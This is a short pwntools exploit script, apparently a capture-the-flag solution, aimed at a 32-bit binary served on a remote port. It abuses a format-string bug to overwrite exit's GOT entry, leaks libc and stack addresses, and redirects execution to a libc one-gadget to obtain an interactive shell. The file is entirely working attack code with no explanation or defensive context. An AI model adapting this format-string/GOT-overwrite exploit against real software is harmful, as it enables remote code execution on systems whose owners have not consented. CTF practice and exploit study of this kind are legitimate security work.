from pwn import *
local=0
if local==1:
	libc=ELF("./libc")
	p=process("./pwnable",env={"LD_PRELOAD":"./libc"})
	one=0x3a80c
elif local==2:
	libc=ELF("/lib/i386-linux-gnu/libc.so.6")
	p=process("./pwnable")
	one=0x3ac5c
else:
	libc=ELF("./libc")
	p=remote("stack.overflow.fail",9002)
	one=0x3a80c

exit_got=0x804a01c
main=0x804851B
payload="AA"+"%2050c%21$hn%32023c%20$hn&%31$p*%5$p"
payload=payload.ljust(38,'\x00')+p32(exit_got)+p32(exit_got+2)
p.sendlineafter("back.",payload)
p.readuntil("&")
base=int(p.read(10),16)-(0xf7e1e637-0xf7e06000)
p.readuntil("*")
stack=int(p.read(10),16)
libc.address=base
one=base+one


low=one&0xffff
#context.log_level='debug'
high=(one&0xffff0000)>>16
magic=0x100000000-0x41410000
payload="%21$n%{}c%19$hn%{}c%20$hn".format(low,high-low)
payload=payload.ljust(34,'\x00')+p32(exit_got)+p32(exit_got+2)+p32(-0x110+stack)



'''
one=0x804a014
low=one&0xffff
context.log_level='debug'
high=(one&0xffff0000)>>16
magic=0x100000000-0x41410000
payload="%19$s"
payload=payload.ljust(34,'\x00')+p32(one)
p.sendlineafter("back.",payload)
'''

log.warning(hex(base))
log.warning(hex(stack))
raw_input()
#gdb.attach(p,'b printf')
p.sendlineafter("back.",payload)
p.interactive()

